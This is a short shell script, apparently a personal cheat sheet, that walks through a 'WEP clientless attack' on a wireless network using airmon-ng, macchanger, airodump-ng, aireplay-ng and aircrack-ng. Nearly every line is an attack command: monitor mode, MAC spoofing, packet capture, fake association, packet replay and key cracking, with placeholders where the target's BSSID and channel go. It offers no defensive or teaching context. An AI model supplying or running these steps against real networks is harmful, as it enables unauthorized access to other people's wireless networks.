#!/bin/sh

 # =========================
 # = wep clientless attack =
 # =========================


modprobe rtc-cmos



# 1 - put card into monitor mode

	airmon-ng stop ath0

	ifconfig wifi0 down


# 2 - Create fake mac address

	macchanger --mac 00:11:22:33:44:55 wifi0

	airmon-ng start wifi0


# 3 - run airodump-ng


	airodump-ng ath0


# find the network to attack
# 
# copy the bssid, channel number and network name



airodump-ng -c (channel number) -w (name for dump packets) --bssid (network bssid) ath0



# 5 - Associate with the access point


aireplay-ng -1 0 -a (network bssid) -h 00:11:22:33:44:55 (faked mac address) ath0


# or with essid name

aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 ath0


# 6 - start aireplay-ng 

aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b (bssid) -h 00:11:22:33:44:55 ath0


# press y


# 7 - run aircrack-ng with the name of your capture file

aircrack-ng wep-01.cap 



aircrack-ng -n 64 --bssid (network bssid) (name for dump packets)


